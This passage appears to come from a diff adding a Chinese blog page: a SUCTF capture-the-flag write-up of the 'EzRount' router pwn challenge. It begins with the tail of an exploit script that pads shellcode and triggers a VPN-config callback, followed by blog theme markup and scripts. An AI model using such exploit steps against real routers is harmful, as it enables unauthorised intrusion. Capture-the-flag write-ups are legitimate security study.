custom=shellcode.ljust(0x7eb,b&quot;\x90&quot;)+b&quot;\x00&quot;))</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    log.info(&quot;Step 4: Triggering Edit_VPN_Custom...&quot;)</span><br><span class="line">    payload = b&quot;\x21\x5c&quot; </span><br><span class="line">    print(client.edit_vpn(payload))</span><br><span class="line">    log.info(&quot;Step 5: Applying VPN (Trigger Callback)...&quot;)</span><br><span class="line">    print(client.apply_vpn())</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SUCTF/" rel="tag">SUCTF</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/as.jpg" data-sizes="auto" alt="从pwn.college入门浏览器安全" class="lazyload">
+        
+      
+      <a href="/2025/12/08/%E8%AE%B0%E5%BD%95/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          从pwn.college入门浏览器安全
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        71.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:40
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-EzRount"><span class="toc-number">1.</span> <span class="toc-text">SUCTF-EzRount</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E8%B6%8A%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">前端越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">二进制分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">架构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">业务逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mainproc"><span class="toc-number">1.2.3.</span> <span class="toc-text">mainproc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "EzRount",
+          url: "https://khighl.github.io.git/2026/03/17/Ez_Rounter/",
+          excerpt: "",
+          description: "",
+          stripContent: "SUCTF-EzRount本来想整个大的, 但无奈水平有限只能尽力做到这个程度 QwQ 本来想设计一个以IPC为主的后端模式, 需要攻击者将cgi与mainproc中的功能通过猜测联系在一起  前端越权通过抓包登录的报文, 我们可以发现如果先是随便输入一对账密 会抓到一个发向http的包 12345678910GET /www/http?auth=0&amp;amp;action=login HTTP/1.1Host: 192.168.41.128:8080Cache-Control: max-age=",
+          date: "Tue Mar 17 2026 00:00:00 GMT+0800",
+          updated: "Tue Mar 17 2026 15:19:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
